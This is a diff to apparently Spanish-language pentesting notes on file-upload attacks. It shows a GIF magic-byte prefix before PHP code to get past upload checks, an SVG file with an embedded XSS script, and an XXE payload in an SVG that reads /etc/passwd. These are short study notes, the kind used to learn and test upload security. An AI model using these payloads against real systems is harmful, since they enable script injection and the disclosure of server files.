@@ -16,3 +16,18 @@ siempre agregar, previo al código malicioso un "tipo de archivo" en base a los 
 "
 GIFF8
 <?php .... ?>
+
+XSS:
+
+Añadir código malicioso en la metadata de los archivos.
+sgv example:
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+
+
+XXE:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
